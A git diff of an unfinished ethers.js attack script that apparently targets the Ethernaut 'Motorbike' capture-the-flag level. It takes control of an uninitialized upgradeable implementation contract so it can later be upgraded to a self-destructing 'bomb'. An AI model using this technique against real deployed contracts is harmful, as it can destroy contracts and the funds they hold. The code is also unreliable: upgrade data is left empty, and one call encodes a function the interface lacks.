@@ -39,19 +39,26 @@ const attackMotorbike = async () => {
     const funcSign = ["function initialize() external initializer"];
     const iface = new ethers.utils.Interface(funcSign);
     const data = iface.encodeFunctionData("initialize()");
-    const tx1 = await wallet.sendTransaction({
+    const tx = await wallet.sendTransaction({
         from: playerAddress,
         to: implAddress1,
         data: data,
     });
-    const txReceipt1 = await tx1.wait();
+    const txReceipt = await tx.wait();
     // TODO: check upgrader is now player
     const funcSignBomb = ["function bomb() public"];
     const ifaceBomb = new ethers.utils.Interface(funcSignBomb);
     const bombDAta = ifaceBomb.encodeFunctionData("initialize()");
     const upgradeSignature = "";
     const upgradeParams = [bombDAta, upgradeSignature];
-    // interface below
+    const upgradeData = "";
+    const tx1 = await wallet.sendTransaction({
+        from: playerAddress,
+        to: implAddress,
+        data: upgradeData,
+    });
+    const txReceipt1 = await tx1.wait();
+    console.log(txReceipt1);
 };
 
 attackMotorbike()
